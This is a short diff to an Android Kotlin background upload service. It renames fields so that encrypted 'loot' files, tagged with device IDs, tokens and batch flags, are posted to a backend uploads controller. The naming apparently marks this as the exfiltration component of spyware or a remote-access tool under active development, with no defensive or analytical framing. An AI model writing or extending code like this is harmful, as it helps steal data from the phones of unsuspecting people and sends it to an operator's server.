@@ -404,14 +404,24 @@ class UploadService : Service() {
             notificationManager.notify(NOTIFICATION_ID, builder.build())
         }
 
-        val body = MultipartBody.Part.createFormData("varLoot", "$filename.txt", requestFile)
+        // Use "loot_file" to match backend UploadsController expectation
+        val body = MultipartBody.Part.createFormData("loot_file", "$filename.enc", requestFile)
         val textType = "text/plain".toMediaTypeOrNull()
-        val requestBody0 = partToken.toRequestBody(textType)
-        val requestBody1 = partDevId.toRequestBody(textType)
-        val varBatch = (if (isContinuation) "1" else "0").toRequestBody(textType)
+        val requestBodyToken = partToken.toRequestBody(textType)
+        val requestBodyDevId = partDevId.toRequestBody(textType)
+        val requestBodyContinuation = (if (isContinuation) "true" else "false").toRequestBody(textType)
+        val requestBodyBatch = (if (isContinuation) "1" else "0").toRequestBody(textType)
 
         Log.i(kon.TAGGED, "Enqueueing upload request to server (continuation=$isContinuation)")
-        val call = service.upload(requestBody0, requestBody1, varBatch, body)
+        val call = service.upload(
+            requestBodyToken,        // varUser
+            requestBodyToken,        // varToken
+            requestBodyDevId,        // varDev
+            requestBodyDevId,        // varDevId
+            requestBodyContinuation, // is_continuation
+            requestBodyBatch,        // varBatch
+            body                     // loot_file
+        )
 
         return try {
             val response = call.execute()
